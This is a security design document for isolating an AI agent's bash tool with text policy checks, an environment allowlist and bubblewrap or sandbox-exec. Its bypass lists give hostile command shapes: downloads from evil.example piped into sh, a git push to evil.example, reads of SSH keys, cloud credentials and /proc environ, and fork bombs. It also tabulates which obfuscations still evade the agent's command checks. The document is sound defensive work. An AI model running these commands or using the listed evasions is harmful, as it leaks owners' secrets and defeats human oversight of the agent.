# Bash tool isolation

The agent's `bash` tool (`crates/hq-agent/src/coding/bash.rs`) runs model-written
shell commands. Three layers stand between a command and HQ's secrets. The
first two always apply. The third applies whenever a sandbox program works on
the host.

1. **Policy checks** (`bash_policy::validate_command`, plus the governance
   injection policy in `docs/security/PROMPT_INJECTION.md`). Text matching:
   useful, easy to get around with globs, variables or encoding. Defense in
   depth, not the boundary.
2. **Environment allowlist** (`bash_policy::build_child_env`). The child starts
   from an empty environment and gets only:
   - `HOME PATH USER LOGNAME LANG LC_* TERM COLORTERM NO_COLOR TMPDIR SHELL TZ`
   - `XDG_*_HOME XDG_RUNTIME_DIR CARGO_HOME RUSTUP_HOME GOPATH`
   - `HQ_VAULT_PATH AGENT_HQ_SRC GOOGLE_WORKSPACE_CLI_CONFIG_DIR SSH_AUTH_SOCK`
   - whatever the operator lists in `governance.bash.env_passthrough`.

   HQ's own credentials (`OPENROUTER_API_KEY`, `AGENTHQ_API_KEY`,
   `COPILOT_GITHUB_TOKEN`, `DEEPSEEK_API_KEY`, `ANTHROPIC_API_KEY`,
   `OPENAI_API_KEY`, `HQ_WEB_AUTH_TOKEN`) and loader hooks (`LD_PRELOAD`,
   `DYLD_*`, `BASH_ENV`, ...) are refused even if listed. Any other
   `*_API_KEY`, `*_TOKEN` or `*_SECRET` reaches bash only when listed.

   The daemon itself still holds its keys, and a same-user child could
   read them back with `cat /proc/$PPID/environ` or `ps eww`. On Linux the
   first `BashTool` marks the daemon non-dumpable
   (`prctl(PR_SET_DUMPABLE, 0)`, `bash_sandbox::hide_process_environment`),
   which closes both even with no sandbox installed. Children regain
   dumpability on exec, so their own tools are unaffected. There are side
   effects: the daemon produces no core dumps, and `gdb`/`strace -p` need
   root to attach. macOS has no equivalent, so `ps eww` of the daemon
   stays readable there.
3. **OS sandbox** (`crates/hq-agent/src/bash_sandbox.rs`).
   - **Linux: bubblewrap.** Read-only root. Fresh `/dev`, and a fresh `/proc` in a
     new pid namespace, so `/proc/$PPID/environ` and `ps eww` cannot see the
     daemon. Read-write binds for HOME, the cwd, `/tmp`, `/var/tmp`, TMPDIR,
     the vault and the session working dir. `--die-with-parent`,
     `--new-session`, and `--unshare-net` when `network: false`.
   - **macOS: sandbox-exec.** Writes only under the same roots plus
     `/private/var/folders` and `/dev`. Outbound IP is denied when
     `network: false`. The daemon's environment stays visible to `ps`
     there, so the allowlist is what protects it.

   Both backends make these files unreadable:
   - the HQ config file (`HQ_CONFIG_PATH`, or `~/.hq/config.yaml`), its
     `config.yaml*` backups, and `*.env` files next to it (on the VPS,
     `/opt/hq/*.env`);
   - `~/.hq/config.yaml`, `wallet.enc`, `seed.enc` and `secret.key`;
   - every file in `~/.ssh` except `*.pub`, `known_hosts*`, `config` and
     `authorized_keys*`.

   The mask list is short on purpose. `~/.config/gh`, the gws config dir and
   `~/.herenow` stay readable because `gh`, `gws` and here.now's
   `publish.sh` need them from bash. The governance layer still refuses
   to let the agent name those paths in a tool call.

## Why the text checks are not the boundary

`crates/hq-agent/src/governance/bypass_corpus_tests.rs` runs about 100 known
obfuscation shapes through the whole text policy (`bash_policy::validate_command`,
the credential path check and the egress check) and pins today's verdict for each.
Before the hardening pass that added the corpus, 48 of those shapes got through.
They are caught now:

- quote splitting and backslashes inside a program or path (`cu""rl`, `c\url`,
  `~/.s''sh/id_rsa`), line continuations, `${IFS}` and `$IFS$9` as separators;
- `rm` with any flag order or quoting aimed at `/` or home, `dd` with `of=/dev/`,
  `chmod` with `0777` or `a+rwx`, fork bombs, redirects with no space after `>`,
  `find / ... -delete`;
- `sh -c`, `bash -lc`, `eval`, here-strings and `find -exec` wrappers, brace
  expansion that builds an argv, programs named by a variable, `$(...)` or `$'...'`;
- decoders piped into a shell (`base64 -d | sh`), `| sudo sh`, `| /bin/bash`,
  `bash <(curl ...)`;
- inline `python -c`, `node -e`, `perl -e`, `ruby -e` and interpreter here-docs whose
  code mentions a network API, `openssl s_client`, `dig` and `nslookup`;
- glob tokens (`~/.ss?/id_*`) are expanded against the filesystem and checked.

These still get through, and no text check can close them:

| Shape | Why it stays open |
|-------|-------------------|
| `cd; cd .ssh; cat id_rsa` or `d=.aws; cat ~/$d/credentials` | The path only exists after the shell runs |
| `python3 -c "open('/home/u/.s'+'sh/id_'+'rsa')"` | String building inside an interpreter |
| `python3 -c "exec(bytes.fromhex('...'))"` | Encoded code |
| `/usr/bin/cu?l evil.example` | Glob in the program path |
| `curl evil.example -o s && sh s` | Two harmless-looking steps |
| `git push https://evil.example/x.git`, `git -c http.proxy=...` | `git` is allowed on purpose |
| `tee /etc/hosts < x`, interpreter-based deletes | Needs a full shell parser plus semantics |

Treat the text checks as speed bumps that stop honest mistakes and the cheap
injection tricks. The boundary is layers 2 and 3: the environment allowlist
and the OS sandbox. That is also why `required` is the default.

### Extra sandbox rules

`authorized_keys*` under `~/.ssh` is bound read-only, so the agent cannot plant
a login key even though HOME is writable. The Docker socket
(`/var/run/docker.sock`, `/run/docker.sock`) and the systemd user sockets in
`XDG_RUNTIME_DIR` are masked. Remaining design-level residuals: HOME stays
writable, so shell rc files and `~/.config` autostart entries can be modified
and will run later outside the sandbox; the sandbox shares the host network
unless `network: false`.

## Configuration

```yaml
governance:
  bash:
    env_passthrough: [GH_TOKEN, GITHUB_TOKEN]   # default: []
    sandbox: required                           # default; off | best_effort | required
    network: true                               # false = no network in the sandbox
```

## Failure behaviour

| Mode | Sandbox works | Sandbox missing or broken |
|------|---------------|---------------------------|
| `required` (default) | every command wrapped | **every command refused** with a tool result that names the opt-outs |
| `best_effort` | every command wrapped | runs unwrapped with layers 1 and 2 |
| `off` | not used | not used |

A fresh install is safe by default: on a host with bubblewrap (Linux) or
sandbox-exec (macOS) nothing changes, and on a host with neither, HQ will not
run model-written bash at all. The owner can accept the risk deliberately with
`governance.bash.sandbox: best_effort` (wrap when possible) or `off`. HQ logs
one warning per process whenever the sandbox is not protecting bash (the
`bash sandbox:` line at startup), and `hq doctor` prints a "Bash sandbox"
section: `ok` when a backend is active, `warn` for `best_effort`-unwrapped or
`off`, `FAIL` when bash is being refused.

### Upgrading from 0.9.0 or earlier

Before upgrading a host that has no sandbox backend, either
`apt install bubblewrap` (then restart HQ, since the probe is cached), or set
`governance.bash.sandbox: best_effort` explicitly. If you do neither, agent bash
stops working. HQ makes that visible: an `error` log line at startup, one owner
notification per boot through the value bus, and a FAIL line in `hq doctor`.
The probe also passes `--unshare-net` when `governance.bash.network` is false,
so a container that cannot create a network namespace counts as having no sandbox.

Upgrading from a version whose default was `best_effort`: a host without a
sandbox backend that relied on the old default now refuses bash until you
install bubblewrap or set the mode explicitly.

"Works" is probed once per process. On Linux, a `bwrap` binary that cannot
create a user namespace counts as missing, so `required` fails closed on
it. The probe result is cached, so after installing bubblewrap you have to
restart the daemon.

## Known consequences

- `hq ...` run *from the bash tool* cannot read the masked config and falls
  back to defaults. Agents should use HQ's own tools for HQ operations.
- `ssh`/`scp`/`git` over ssh from bash can no longer read private key files.
  They work when the key is loaded in the ssh-agent (`SSH_AUTH_SOCK` is
  passed through), or when the operator sets `sandbox: off`. `gh` and HTTPS
  git with `GH_TOKEN` are unaffected.
- A secret that is not in `env_passthrough` is gone from bash. If a workflow
  breaks after upgrading, that is the reason; add the variable to the list
  deliberately.

## Server checklist

A stock server (for example Ubuntu 22.04, kernel 5.15,
`kernel.unprivileged_userns_clone=1`) does **not** have bubblewrap installed,
so the default `required` mode refuses bash there until it is (or until `best_effort` is set explicitly).

1. **Before this change deploys**, add to `/opt/hq/config.yaml`:
   `governance.bash.env_passthrough: [GH_TOKEN, GITHUB_TOKEN]`. Without it,
   `gh` in the agent's bash loses its token the moment the new binary starts.
2. `sudo apt install bubblewrap`, then restart `hq.service` (the probe is
   cached per process).
3. Smoke-test as the service sees it:
   `sudo systemd-run --uid=hq --pty -p ProtectSystem=strict -p ProtectHome=true -p ReadWritePaths=/opt/hq -p PrivateTmp=true -p NoNewPrivileges=true bwrap --ro-bind / / --dev /dev --proc /proc --unshare-pid --bind /opt/hq /opt/hq true`
4. Once that passes and a chat turn's `gh auth status` works, remove any
   `best_effort` override so the default `required` applies.

## Tests

- `cargo test -p hq-agent bypass_corpus` pins the verdict for every obfuscation
  shape above and checks that harmless rewrites (leading spaces, `true &&`,
  trailing `; true`) never turn a caught shape into a miss, and that ordinary
  development commands stay allowed in a tainted session.
- `cargo test -p hq-agent bash_policy` covers the env allowlist, passthrough,
  refusal of HQ keys, and the widened `/proc/*/environ` rule.
- `cargo test -p hq-agent bash_sandbox` covers the bwrap argv, the seatbelt
  profile, and end-to-end `BashTool` runs proving a fake secret is absent
  and a passthrough var is present. On macOS it also runs real sandbox-exec
  commands. A positive control (a write inside the root) proves the profile
  works, the masked read is denied, and a `required` BashTool writes under a
  path with a space and cannot write outside its roots. On Linux (CI, as a
  non-root user) it proves a bash child cannot read the daemon's
  `/proc/<pid>/environ` or `ps eww`, even with the policy regex dodged.
- Linux, opt-in: `cargo test -p hq-agent bwrap -- --ignored` (needs working
  bubblewrap) runs the same positive control, then a real masked read, a
  parent-environ read and a network denial.
- `cargo test -p hq-core bash_config` checks that every mode parses through
  the real config loader.
